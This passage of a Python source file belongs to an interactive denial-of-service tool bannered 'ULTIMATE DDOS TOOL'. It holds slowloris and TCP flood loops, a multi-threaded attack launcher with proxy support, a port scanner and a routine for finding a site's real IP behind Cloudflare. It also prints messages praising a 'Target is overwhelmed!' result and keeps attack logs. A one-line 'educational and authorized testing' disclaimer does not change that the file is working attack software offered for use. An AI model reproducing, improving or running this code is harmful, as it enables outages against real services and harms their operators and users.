                self.stats.add_connection()
                sock.close()
            except:
                self.stats.add_error()
                
    def slowloris_loop(self):
        """Slowloris attack loop"""
        sockets = []
        
        while self.running:
            try:
                if len(sockets) < 1000:
                    sock = self._create_socket()
                    sock.connect((self.target_ip, self.target_port))
                    sockets.append(sock)
                    self.slowloris_attack(sock)
                else:
                    time.sleep(1)
            except:
                self.stats.add_error()
                
    def tcp_flood_heavy(self):
        """Heavy TCP flood with maximum threads"""
        while self.running:
            try:
                for _ in range(10):
                    sock = self._create_socket()
                    sock.connect_ex((self.target_ip, self.target_port))
                    self.stats.add_connection()
                    sock.close()
            except:
                self.stats.add_error()

# ============= TOOLS CLASS =============
class ToolManager:
    """Manage reconnaissance tools"""
    
    def __init__(self):
        self.results = {}
        
    def dns_lookup(self, domain: str) -> Dict:
        """Perform DNS lookup"""
        results = {}
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        for rtype in record_types:
            try:
                result = socket.getaddrinfo(domain, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
                results[rtype] = [addr[4][0] for addr in result]
            except:
                results[rtype] = []
                
        return results
        
    def ping_test(self, target: str, count: int = 4) -> Dict:
        """Perform ping test"""
        results = {
            'success': False,
            'times': [],
            'min': 0,
            'max': 0,
            'avg': 0,
            'packet_loss': 0
        }
        
        for i in range(count):
            try:
                start = time.time()
                socket.gethostbyname(target)
                end = time.time()
                ping_time = (end - start) * 1000
                results['times'].append(ping_time)
            except:
                pass
                
        if results['times']:
            results['success'] = True
            results['min'] = min(results['times'])
            results['max'] = max(results['times'])
            results['avg'] = sum(results['times']) / len(results['times'])
            results['packet_loss'] = (count - len(results['times'])) / count * 100
            
        return results
        
    def check_status(self, url: str) -> Dict:
        """Check website status"""
        try:
            start = time.time()
            req = urllib.request.Request(url, headers={'User-Agent': random.choice(USER_AGENTS)})
            response = urllib.request.urlopen(req, timeout=TIMEOUT)
            response_time = (time.time() - start) * 1000
            
            return {
                'success': True,
                'status_code': response.getcode(),
                'response_time': response_time,
                'server': response.headers.get('Server', 'Unknown'),
                'size': len(response.read())
            }
        except urllib.error.HTTPError as e:
            return {
                'success': False,
                'status_code': e.code,
                'error': str(e)
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
            
    def port_scan(self, target: str, ports: List[int]) -> List[int]:
        """Scan ports"""
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                if sock.connect_ex((target, port)) == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
                
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(scan_port, ports)
            
        return open_ports
        
    def find_real_ip(self, domain: str) -> List[str]:
        """Find real IP behind Cloudflare"""
        ips = set()
        
        # Direct resolution
        try:
            ip = socket.gethostbyname(domain)
            ips.add(ip)
        except:
            pass
            
        # Historical DNS records
        # Note: This would require external APIs in real implementation
        
        # Subdomain enumeration
        common_subdomains = ['www', 'mail', 'ftp', 'blog', 'shop', 'api', 'admin', 'test']
        for sub in common_subdomains:
            try:
                ip = socket.gethostbyname(f"{sub}.{domain}")
                ips.add(ip)
            except:
                pass
                
        return list(ips)

# ============= MAIN APPLICATION =============
class DoSUltimate:
    """Main application class"""
    
    def __init__(self):
        self.target = ""
        self.target_ip = ""
        self.target_host = ""
        self.target_port = 80
        self.use_ssl = False
        self.threads = 500
        self.duration = 60
        self.method = "get"
        self.running = False
        self.stats = AttackStats()
        self.engine = None
        self.threads_list = []
        self.proxy_manager = ProxyManager()
        self.tool_manager = ToolManager()
        self.config = self.load_config()
        
    def load_config(self) -> Dict:
        """Load configuration from file"""
        config = {
            'default_threads': 500,
            'default_duration': 60,
            'default_method': 'get',
            'proxy_file': 'proxies.txt',
            'log_file': 'attack_log.txt'
        }
        
        config_file = 'ddos_config.ini'
        if os.path.exists(config_file):
            try:
                cp = configparser.ConfigParser()
                cp.read(config_file)
                if 'Settings' in cp:
                    for key in config:
                        if key in cp['Settings']:
                            config[key] = cp['Settings'][key]
            except:
                pass
                
        return config
        
    def save_config(self):
        """Save configuration to file"""
        cp = configparser.ConfigParser()
        cp['Settings'] = {
            'default_threads': str(self.config['default_threads']),
            'default_duration': str(self.config['default_duration']),
            'default_method': self.config['default_method'],
            'proxy_file': self.config['proxy_file'],
            'log_file': self.config['log_file']
        }
        
        with open('ddos_config.ini', 'w') as f:
            cp.write(f)
            
    def clear_screen(self):
        """Clear console screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def print_banner(self):
        """Print application banner"""
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════╗
║ ╔═══════════════════════════════════════╗ ║
║ ║  ULTIMATE DDOS TOOL v{VERSION:<10}    ║ ║
║ ║  AUTHOR: {AUTHOR:<20}                 ║ ║
║ ║  RELEASE: {RELEASE_DATE:<20}          ║ ║
║ ╚═══════════════════════════════════════╝ ║
╚═══════════════════════════════════════════╝
{Colors.RESET}
"""
        print(banner)
        
    def print_attack_methods(self, category: str = None):
        """Print available attack methods"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        
        methods = AttackDatabase.ATTACK_METHODS
        
        if category and category != 'all':
            filtered = {k: v for k, v in methods.items() if v.get('type') == category}
        else:
            filtered = methods
            
        # Group by layer
        layer7 = [(k, v) for k, v in filtered.items() if v.get('layer') == 7 and v.get('type') != 'amp']
        layer4 = [(k, v) for k, v in filtered.items() if v.get('layer') == 4]
        layer3 = [(k, v) for k, v in filtered.items() if v.get('layer') == 3]
        amp = [(k, v) for k, v in filtered.items() if v.get('type') == 'amp']
        game = [(k, v) for k, v in filtered.items() if v.get('type') == 'game']
        
        if layer7:
            print(f"\n{Colors.GREEN}LAYER 7 - HTTP/HTTPS Methods:{Colors.RESET}")
            for name, info in layer7[:15]:
                print(f"  {Colors.YELLOW}{name:20}{Colors.RESET} - {info['desc']}")
                
        if layer4:
            print(f"\n{Colors.GREEN}LAYER 4 - Network Methods:{Colors.RESET}")
            for name, info in layer4[:15]:
                print(f"  {Colors.YELLOW}{name:20}{Colors.RESET} - {info['desc']}")
                
        if layer3:
            print(f"\n{Colors.GREEN}LAYER 3 - ICMP Methods:{Colors.RESET}")
            for name, info in layer3:
                print(f"  {Colors.YELLOW}{name:20}{Colors.RESET} - {info['desc']}")
                
        if amp:
            print(f"\n{Colors.GREEN}AMPLIFICATION Methods:{Colors.RESET}")
            for name, info in amp[:10]:
                print(f"  {Colors.YELLOW}{name:20}{Colors.RESET} - {info['desc']}")
                
        if game:
            print(f"\n{Colors.GREEN}GAME SERVER Methods:{Colors.RESET}")
            for name, info in game:
                print(f"  {Colors.YELLOW}{name:20}{Colors.RESET} - {info['desc']}")
                
        print(f"\n{Colors.CYAN}Total methods available: {len(filtered)}{Colors.RESET}")
        
    def print_tools(self):
        """Print available tools"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.GREEN}AVAILABLE TOOLS:{Colors.RESET}")
        
        for name, info in AttackDatabase.TOOLS.items():
            print(f"  {Colors.YELLOW}{name:15}{Colors.RESET} - {info['desc']}")
            
        print(f"\n{Colors.CYAN}Total tools: {len(AttackDatabase.TOOLS)}{Colors.RESET}")
        
    def resolve_target(self, target: str) -> Tuple[Optional[str], bool]:
        """Resolve target to IP address"""
        try:
            target = target.replace('http://', '').replace('https://', '').split('/')[0]
            ip = socket.gethostbyname(target)
            return ip, True
        except socket.gaierror:
            return None, False
        except Exception as e:
            return None, False
            
    def run_tool(self, tool_name: str, target: str):
        """Run a specific tool"""
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{Colors.CYAN}Running {tool_name.upper()} on {target}...{Colors.RESET}\n")
        
        if tool_name == 'dns':
            results = self.tool_manager.dns_lookup(target)
            for record, ips in results.items():
                if ips:
                    print(f"{Colors.GREEN}{record}:{Colors.RESET}")
                    for ip in ips:
                        print(f"  {ip}")
                        
        elif tool_name == 'ping':
            results = self.tool_manager.ping_test(target)
            if results['success']:
                print(f"{Colors.GREEN}Ping Results:{Colors.RESET}")
                print(f"  Min: {results['min']:.2f} ms")
                print(f"  Max: {results['max']:.2f} ms")
                print(f"  Avg: {results['avg']:.2f} ms")
                print(f"  Packet Loss: {results['packet_loss']:.1f}%")
            else:
                print(f"{Colors.RED}Failed to ping target{Colors.RESET}")
                
        elif tool_name == 'check':
            url = target if target.startswith('http') else f"http://{target}"
            results = self.tool_manager.check_status(url)
            if results['success']:
                print(f"{Colors.GREEN}Status:{Colors.RESET} {results['status_code']}")
                print(f"{Colors.GREEN}Response Time:{Colors.RESET} {results['response_time']:.2f} ms")
                print(f"{Colors.GREEN}Server:{Colors.RESET} {results['server']}")
            else:
                print(f"{Colors.RED}Failed: {results.get('error', 'Unknown error')}{Colors.RESET}")
                
        elif tool_name == 'cfip':
            ips = self.tool_manager.find_real_ip(target)
            print(f"{Colors.GREEN}Possible real IPs:{Colors.RESET}")
            for ip in ips:
                print(f"  {ip}")
                
        elif tool_name == 'portscan':
            print(f"{Colors.YELLOW}Scanning common ports...{Colors.RESET}")
            common_ports = [21, 22, 23, 25, 53, 80, 443, 8080, 8443, 3306, 3389, 5432, 27017]
            open_ports = self.tool_manager.port_scan(target, common_ports)
            if open_ports:
                print(f"{Colors.GREEN}Open ports:{Colors.RESET}")
                for port in open_ports:
                    print(f"  {port}")
            else:
                print(f"{Colors.RED}No open ports found{Colors.RESET}")
                
        else:
            print(f"{Colors.RED}Tool '{tool_name}' not implemented yet{Colors.RESET}")
            
        input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.RESET}")
        
    def start_attack(self):
        """Start attack with current settings"""
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{Colors.RED}{Colors.BOLD}{'!'*60}{Colors.RESET}")
        print(f"{Colors.RED}ATTACK CONFIGURATION{Colors.RESET}")
        print(f"{Colors.RED}{'!'*60}{Colors.RESET}")
        print(f"{Colors.CYAN}Target:{Colors.RESET} {self.target_host} ({self.target_ip})")
        print(f"{Colors.CYAN}Port:{Colors.RESET} {self.target_port}")
        print(f"{Colors.CYAN}Protocol:{Colors.RESET} {'HTTPS' if self.use_ssl else 'HTTP'}")
        print(f"{Colors.CYAN}Method:{Colors.RESET} {self.method.upper()}")
        print(f"{Colors.CYAN}Threads:{Colors.RESET} {self.threads}")
        print(f"{Colors.CYAN}Duration:{Colors.RESET} {self.duration} seconds")
        print(f"{Colors.CYAN}Proxies:{Colors.RESET} {len(self.proxy_manager.proxies)} loaded")
        print(f"{Colors.RED}{'!'*60}{Colors.RESET}")
        
        confirm = input(f"\n{Colors.YELLOW}Start attack? (y/n): {Colors.RESET}").lower()
        if confirm != 'y':
            return
            
        self.running = True
        self.stats = AttackStats()
        self.engine = AttackEngine(
            self.target_ip, self.target_port, self.target_host,
            self.stats, self.use_ssl, self.proxy_manager
        )
        
        # Start attack threads
        self.threads_list = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.engine.run_method, args=(self.method,))
            t.daemon = True
            t.start()
            self.threads_list.append(t)
            
        # Statistics thread
        def stats_printer():
            start_time = time.time()
            while self.running and (time.time() - start_time) < self.duration:
                time.sleep(1)
                elapsed = time.time() - start_time
                remaining = self.duration - elapsed
                
                packets = self.stats.packets_sent
                mb = self.stats.get_total_mb()
                speed = self.stats.get_speed()
                bandwidth = self.stats.get_bandwidth()
                errors = self.stats.errors
                
                # Progress bar
                progress = int((elapsed / self.duration) * 30)
                bar = f"{Colors.GREEN}{'█' * progress}{Colors.WHITE}{'░' * (30 - progress)}{Colors.RESET}"
                
                print(f"\r{bar} | {Colors.CYAN}{elapsed:.0f}/{self.duration}s{Colors.RESET} "
                      f"| {Colors.GREEN}{packets:,} pkt{Colors.RESET} "
                      f"| {Colors.BLUE}{mb:.1f} MB{Colors.RESET} "
                      f"| {Colors.YELLOW}{speed:.0f} p/s{Colors.RESET} "
                      f"| {Colors.MAGENTA}{bandwidth:.1f} Mbps{Colors.RESET} "
                      f"| {Colors.RED}{errors} err{Colors.RESET}", end="")
                      
            print()
            
        stats_thread = threading.Thread(target=stats_printer)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Wait for attack duration
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Attack interrupted by user{Colors.RESET}")
        finally:
            self.running = False
            self.engine.running = False
            
        # Print final statistics
        self.print_final_stats()
        
    def print_final_stats(self):
        """Print final attack statistics"""
        stats = self.stats.get_stats_dict()
        
        print(f"\n\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}FINAL STATISTICS{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        
        print(f"\n{Colors.WHITE}Target:{Colors.RESET} {self.target_host} ({self.target_ip}:{self.target_port})")
        print(f"{Colors.WHITE}Method:{Colors.RESET} {self.method.upper()}")
        print(f"{Colors.WHITE}Duration:{Colors.RESET} {stats['elapsed']:.1f} seconds")
        print(f"{Colors.WHITE}Threads:{Colors.RESET} {self.threads}")
        
        print(f"\n{Colors.GREEN}Packets Sent:{Colors.RESET} {stats['packets']:,}")
        print(f"{Colors.GREEN}Data Sent:{Colors.RESET} {stats['mb']:.2f} MB ({stats['gb']:.3f} GB)")
        print(f"{Colors.GREEN}Connections:{Colors.RESET} {stats['connections']:,}")
        print(f"{Colors.RED}Errors:{Colors.RESET} {stats['errors']:,}")
        
        print(f"\n{Colors.YELLOW}Average Speed:{Colors.RESET} {stats['speed']:.0f} packets/sec")
        print(f"{Colors.YELLOW}Average Bandwidth:{Colors.RESET} {stats['bandwidth']:.1f} Mbps")
        
        # Performance rating
        if stats['bandwidth'] > 100:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🔥 EXCELLENT! Target is overwhelmed! 🔥{Colors.RESET}")
        elif stats['bandwidth'] > 50:
            print(f"\n{Colors.YELLOW}{Colors.BOLD}⚡ GOOD! Significant impact achieved! ⚡{Colors.RESET}")
        elif stats['bandwidth'] > 10:
            print(f"\n{Colors.BLUE}{Colors.BOLD}📡 MODERATE! Consider increasing threads! 📡{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}{Colors.BOLD}⚠ LOW impact! Try increasing threads or different method! ⚠{Colors.RESET}")
            
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        
        # Save log
        self.save_attack_log(stats)
        
    def save_attack_log(self, stats: Dict):
        """Save attack log to file"""
        log_file = f"attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        log_data = {
            'timestamp': datetime.now().isoformat(),
            'target': self.target_host,
            'target_ip': self.target_ip,
            'target_port': self.target_port,
            'method': self.method,
            'threads': self.threads,
            'duration': stats['elapsed'],
            'protocol': 'HTTPS' if self.use_ssl else 'HTTP',
            'statistics': stats
        }
        
        try:
            with open(log_file, 'w') as f:
                json.dump(log_data, f, indent=4)
            print(f"\n{Colors.GREEN}Log saved to: {log_file}{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.RED}Failed to save log: {e}{Colors.RESET}")
            
    def run(self):
        """Main application loop"""
        while True:
            self.clear_screen()
            self.print_banner()
            
            print(f"\n{Colors.WHITE}{Colors.BOLD}MAIN MENU{Colors.RESET}")
            print(f"{Colors.CYAN}{'─'*40}{Colors.RESET}")
            print(f"  {Colors.GREEN}1.{Colors.RESET} Start Attack")
            print(f"  {Colors.GREEN}2.{Colors.RESET} Show Attack Methods ({len(AttackDatabase.ATTACK_METHODS)} methods)")
            print(f"  {Colors.GREEN}3.{Colors.RESET} Show Tools ({len(AttackDatabase.TOOLS)} tools)")
            print(f"  {Colors.GREEN}4.{Colors.RESET} Settings")
            print(f"  {Colors.GREEN}5.{Colors.RESET} Load Proxies")
            print(f"  {Colors.GREEN}6.{Colors.RESET} About")
            print(f"  {Colors.RED}7.{Colors.RESET} Exit")
            print(f"{Colors.CYAN}{'─'*40}{Colors.RESET}")
            
            choice = input(f"\n{Colors.YELLOW}Select option: {Colors.RESET}").strip()
            
            if choice == '1':
                # Attack setup
                self.clear_screen()
                self.print_banner()
                
                target = input(f"{Colors.WHITE}Target (IP or domain): {Colors.RESET}").strip()
                if not target:
                    continue
                    
                ip, valid = self.resolve_target(target)
                if not valid:
                    print(f"{Colors.RED}[!] Invalid target{Colors.RESET}")
                    input("Press Enter...")
                    continue
                    
                self.target_host = target
                self.target_ip = ip
                print(f"{Colors.GREEN}[+] Resolved: {ip}{Colors.RESET}")
                
                port = input(f"Port [{self.target_port}]: {Colors.RESET}").strip()
                if port.isdigit():
                    self.target_port = int(port)
                    
                ssl_input = input(f"Use HTTPS? (y/n) [{self.use_ssl}]: {Colors.RESET}").strip().lower()
                if ssl_input in ['y', 'yes']:
                    self.use_ssl = True
                    if self.target_port == 80:
                        self.target_port = 443
                elif ssl_input in ['n', 'no']:
                    self.use_ssl = False
                    
                print(f"\n{Colors.CYAN}Available methods: get, post, udp, tcp, syn, slow, killer, etc.{Colors.RESET}")
                method = input(f"Method [{self.method}]: {Colors.RESET}").strip().lower()
                if method and method in AttackDatabase.ATTACK_METHODS:
                    self.method = method
                elif method:
                    print(f"{Colors.YELLOW}Method '{method}' not found, using {self.method}{Colors.RESET}")
                    
                threads = input(f"Threads (1-{MAX_THREADS}) [{self.threads}]: {Colors.RESET}").strip()
                if threads.isdigit():
                    self.threads = min(int(threads), MAX_THREADS)
                    
                duration = input(f"Duration (seconds) [{self.duration}]: {Colors.RESET}").strip()
                if duration.isdigit():
                    self.duration = int(duration)
                    
                self.start_attack()
                input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.RESET}")
                
            elif choice == '2':
                self.clear_screen()
                self.print_banner()
                
                print(f"\n{Colors.YELLOW}Filter by category? (all/l7/l4/amp/game): {Colors.RESET}")
                cat = input().strip().lower()
                
                self.clear_screen()
                self.print_banner()
                
                if cat == 'l7':
                    self.print_attack_methods('http')
                elif cat == 'l4':
                    self.print_attack_methods('tcp')
                elif cat == 'amp':
                    self.print_attack_methods('amp')
                elif cat == 'game':
                    self.print_attack_methods('game')
                else:
                    self.print_attack_methods('all')
                    
                input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.RESET}")
                
            elif choice == '3':
                self.clear_screen()
                self.print_banner()
                self.print_tools()
                
                print(f"\n{Colors.YELLOW}Run a tool? (enter tool name or press Enter to skip): {Colors.RESET}")
                tool = input().strip().lower()
                
                if tool and tool in AttackDatabase.TOOLS:
                    target = input(f"{Colors.WHITE}Target: {Colors.RESET}").strip()
                    if target:
                        self.run_tool(tool, target)
                        
                input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.RESET}")
                
            elif choice == '4':
                self.clear_screen()
                self.print_banner()
                
                print(f"\n{Colors.CYAN}{Colors.BOLD}SETTINGS{Colors.RESET}")
                print(f"  Default Threads: {self.config['default_threads']}")
                print(f"  Default Duration: {self.config['default_duration']}")
                print(f"  Default Method: {self.config['default_method']}")
                print(f"  Proxy File: {self.config['proxy_file']}")
                print(f"  Log File: {self.config['log_file']}")
                
                print(f"\n{Colors.YELLOW}Reset to defaults? (y/n): {Colors.RESET}")
                if input().lower() == 'y':
                    self.config = {
                        'default_threads': 500,
                        'default_duration': 60,
                        'default_method': 'get',
                        'proxy_file': 'proxies.txt',
                        'log_file': 'attack_log.txt'
                    }
                    self.save_config()
                    print(f"{Colors.GREEN}Settings reset to defaults{Colors.RESET}")
                    
                input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.RESET}")
                
            elif choice == '5':
                self.clear_screen()
                self.print_banner()
                
                print(f"\n{Colors.CYAN}Proxy Management{Colors.RESET}")
                print(f"  Current proxies: {len(self.proxy_manager.proxies)}")
                print(f"  Proxy file: {self.config['proxy_file']}")
                
                print(f"\n{Colors.YELLOW}Load proxies from file? (y/n): {Colors.RESET}")
                if input().lower() == 'y':
                    filepath = input(f"File path [{self.config['proxy_file']}]: {Colors.RESET}").strip()
                    if not filepath:
                        filepath = self.config['proxy_file']
                    self.proxy_manager.load_proxies(filepath)
                    print(f"{Colors.GREEN}Loaded {len(self.proxy_manager.proxies)} proxies{Colors.RESET}")
                    
                input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.RESET}")
                
            elif choice == '6':
                self.clear_screen()
                self.print_banner()
                
                print(f"\n{Colors.CYAN}{Colors.BOLD}ABOUT{Colors.RESET}")
                print(f"  {Colors.WHITE}Name:{Colors.RESET} ULTIMATE DDOS TOOL")
                print(f"  {Colors.WHITE}Version:{Colors.RESET} {VERSION}")
                print(f"  {Colors.WHITE}Author:{Colors.RESET} {AUTHOR}")
                print(f"  {Colors.WHITE}Release:{Colors.RESET} {RELEASE_DATE}")
                print(f"  {Colors.WHITE}Platform:{Colors.RESET} Windows 7/8/8.1/10/11")
                print(f"  {Colors.WHITE}Attack Methods:{Colors.RESET} {len(AttackDatabase.ATTACK_METHODS)}+")
                print(f"  {Colors.WHITE}Tools:{Colors.RESET} {len(AttackDatabase.TOOLS)}+")
                print(f"  {Colors.WHITE}Max Threads:{Colors.RESET} {MAX_THREADS}")
                
                print(f"\n{Colors.YELLOW}{Colors.BOLD}DISCLAIMER:{Colors.RESET}")
                print(f"  This tool is for educational and authorized testing purposes only.")
                print(f"  The author is not responsible for any misuse or damage caused.")
                print(f"  Always ensure you have permission before testing any system.")
                
                input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.RESET}")
                
            elif choice == '7':
                print(f"\n{Colors.GREEN}Exiting...{Colors.RESET}")
                sys.exit(0)
                
# ============= ENTRY POINT =============
def main():
    """Main entry point"""
    try:
        # Set console for colors
        if os.name == 'nt':
            os.system('color')
            
        # Check Windows version
        if platform.system() == 'Windows':
            version = sys.getwindowsversion()
            print(f"{Colors.GREEN}[+] Windows Version: {version.major}.{version.minor}{Colors.RESET}")
            
            if version.major < 6:
                print(f"{Colors.YELLOW}[!] Windows XP/Vista detected. Some features may not work.{Colors.RESET}")
                
        # Elevate privileges if needed
        if not is_admin():
            print(f"{Colors.YELLOW}[!] Not running as administrator. Some features (ICMP, RAW sockets) may not work.{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Run as administrator for full functionality.{Colors.RESET}")
            time.sleep(2)
            
        # Start application
        app = DoSUltimate()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Fatal error: {e}{Colors.RESET}")
        input("Press Enter to exit...")
        sys.exit(1)
        
if __name__ == "__main__":
    main()